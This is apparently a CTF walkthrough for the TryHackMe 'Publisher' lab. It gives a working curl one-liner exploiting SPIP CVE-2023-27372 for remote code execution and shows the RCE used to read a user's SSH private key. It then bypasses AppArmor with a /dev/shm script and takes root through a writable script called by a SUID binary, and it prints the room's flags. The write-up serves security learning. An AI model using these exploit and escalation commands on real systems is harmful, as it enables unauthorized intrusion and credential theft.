# TryHackMe Publisher Room - Complete Walkthrough

![TryHackMe](https://img.shields.io/badge/TryHackMe-Publisher-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Boot2Root-blue?style=for-the-badge)

## 📋 Table of Contents
- [Overview](#overview)
- [Initial Reconnaissance](#initial-reconnaissance)
- [Initial Access](#initial-access)
- [Post-Exploitation](#post-exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Key Learnings](#key-learnings)
- [Tools Used](#tools-used)

## 🎯 Overview
Publisher is a medium-difficulty boot-to-root machine focusing on:
- Web application enumeration
- SPIP CMS exploitation (CVE-2023-27372)
- AppArmor security bypass
- SUID binary abuse for privilege escalation

## 🔍 Initial Reconnaissance

### 🌐 Nmap Scan Results
```bash
nmap -Pn -p- --min-rate 2000 -sC -sV -oN nmap-scan.txt <TARGET_IP>
```
**🎯 Open Ports:**
- `22/tcp` - SSH OpenSSH 8.2p1 Ubuntu
- `80/tcp` - HTTP Apache httpd 2.4.41 (Ubuntu)

### 🕸️ Web Enumeration

#### 📁 Gobuster Directory Discovery
```bash
gobuster dir -u http://publisher.thm -w /usr/share/seclists/Discovery/Web-Content/big.txt -o publisher_80.txt -t 100
```
**🔑 Key Findings:**
- `/spip/` directory - SPIP CMS installation
- SPIP login page at `/spip/spip.php?page=login`

## 🚪 Initial Access - CVE-2023-27372 SPIP RCE

### ⚠️ Vulnerability Details
- **CVE:** `CVE-2023-27372`
- **Target:** SPIP v4.2.0 - Remote Code Execution (Unauthenticated)
- **Type:** Deserialization attack via password reset functionality

### 💥 Exploit Method

#### 🔧 Manual Testing with cURL
1. **🎯 Extract CSRF token:**
```bash
curl -s http://publisher.thm/spip/spip.php?page=spip_pass | grep -i formulaire_action_sign | cut -d "'" -f 2
```

2. **🚀 One-liner RCE command:**
```bash
if echo $SHELL | grep zsh > /dev/null ; then read 'cmd?Enter a command for RCE: '; else read -p 'Enter a command for RCE: ' cmd; fi \
&& php_rce="<?php echo system('echo; echo; echo; ${cmd}; echo; echo; echo;'); ?>" \
&& cmd_length=$(echo $php_rce | tr -d '\n' | wc -m) \
&& curl -s -X POST http://publisher.thm/spip/spip.php?page=spip_pass \
-d "page=spip_pass" \
-d "formulaire_action=oubli" \
-d "formulaire_action_args=$(curl -s http://publisher.thm/spip/spip.php?page=spip_pass | grep -i formulaire_action_sign | cut -d "'" -f 2)" \
-d "oubli=s:${cmd_length}:\"${php_rce}\";"
```

#### 🤖 Using Automated Exploit Script
```bash
# Install missing dependency first
pip3 install alive-progress

# Run the exploit
python CVE-2023-27372.py -u http://publisher.thm/spip/ -v -o cvereport.txt
```

### 🐚 Getting Shell Access
1. **🔍 Discover SSH key via RCE:**
```bash
# Command to run via RCE
cat /home/think/.ssh/id_rsa
```

2. **💾 Save and use the private key:**
```bash
touch id_rsa
chmod 600 id_rsa
# Paste the discovered private key content
ssh -i id_rsa think@publisher.thm
```

## 🔎 Post-Exploitation Enumeration

### 💻 System Information
- **OS:** Ubuntu 20.04.6 LTS (Focal Fossa)
- **Kernel:** Linux 5.4.0-169-generic
- **Current User:** `think` (uid=1000, gid=1000)
- **Shell:** `/usr/sbin/ash` ⚠️ (unusual shell - note this!)

### 🚨 Key Observations
- **🐳 Docker environment present** (docker0 interface, dockerd process)
- **❌ Strange file system behavior:** Can't write to `/tmp`, can't list `/opt`
- **🛡️ AppArmor is enabled** and affecting shell behavior

## 🚀 Privilege Escalation

### 🥇 Method 1: AppArmor Bypass (Recommended)

#### 🧠 Understanding the Issue
- The `think` user's shell (`/usr/sbin/ash`) is constrained by AppArmor
- AppArmor profile in `/etc/apparmor.d/usr.sbin.ash` shows restrictions
- Profile is in "complain" mode but still causes issues
- **💡 Key insight:** AppArmor only restricts the specific binary, not custom scripts

#### 🎯 Exploitation Steps
```bash
# Create bypass script in /dev/shm (not blocked by AppArmor)
echo -e '#! /bin/bash\n/bin/bash -ip' > /dev/shm/pwn.sh
chmod 755 /dev/shm/pwn.sh

# Execute the script to get unrestricted bash shell
/dev/shm/pwn.sh
```

**✅ Why this works:** `/usr/sbin/ash` has an AppArmor profile, but `/dev/shm/pwn.sh` doesn't!

### 🥈 Method 2: SUID Binary Abuse

#### 🔍 Discovery
```bash
# Find SUID binaries
find / -type f -user root -perm /4000 2>/dev/null
```

#### 🎯 Key Finding
- Custom SUID binary: `/opt/run_container`
- Analysis with `strings /opt/run_container` shows it calls `/bin/bash` then `/opt/run_container.sh`

#### 💥 Exploitation
```bash
# Overwrite the script that the SUID binary calls
echo -e '#! /bin/bash\n/bin/bash -ip' > /opt/run_container.sh

# Execute the SUID binary
/opt/run_container
```

**🎉 Result:** Root shell with `euid=0` and `egid=0`

## 🏆 Flags
- **👤 User Flag:** `fa229046d44eda6a3598c73ad96f4ca5`
- **👑 Root Flag:** `3a4225cc9e85709adda6ef55d6a4f2ca`

## 📚 Key Learnings

### 🛡️ AppArmor Security
- AppArmor profiles restrict specific binaries, not all executables
- `/dev/shm` is often a good location for bypass scripts
- Look for unusual shells like `/usr/sbin/ash` - they might indicate security restrictions

### 🔓 SUID Binary Analysis
- Always check custom SUID binaries with `strings`
- Look for scripts or files they call that might be writable
- Custom binaries are more likely to have misconfigurations than system binaries

### 🕸️ SPIP CMS Exploitation
- Version enumeration is crucial for finding CVEs
- Deserialization attacks often involve crafting payloads with specific length calculations
- CSRF tokens in forms need to be extracted and used in exploits

### 🎯 General Methodology
1. **🔍 Thorough enumeration** - Don't stop at first findings
2. **🏗️ Understand the environment** - Docker, AppArmor, unusual shells all matter
3. **🛤️ Multiple vectors** - There are often several ways to escalate privileges
4. **👀 Pay attention to anomalies** - Strange file system behavior often indicates security controls

## 🛠️ Tools Used
- `nmap` - Port scanning
- `gobuster` - Directory enumeration  
- `curl` - Manual exploit testing
- `strings` - Binary analysis
- `find` - SUID binary discovery
- Custom Python exploit script for CVE-2023-27372

---

> **💡 Pro Tip:** Always look for unusual shells and security restrictions like AppArmor when standard privilege escalation techniques don't work as expected!

**Author:** Your Security Notes  
**Date:** Created for TryHackMe Publisher Room  
**Difficulty:** Medium  
**Tags:** `#tryhackme` `#privesc` `#apparmor` `#suid` `#spip` `#cve-2023-27372`
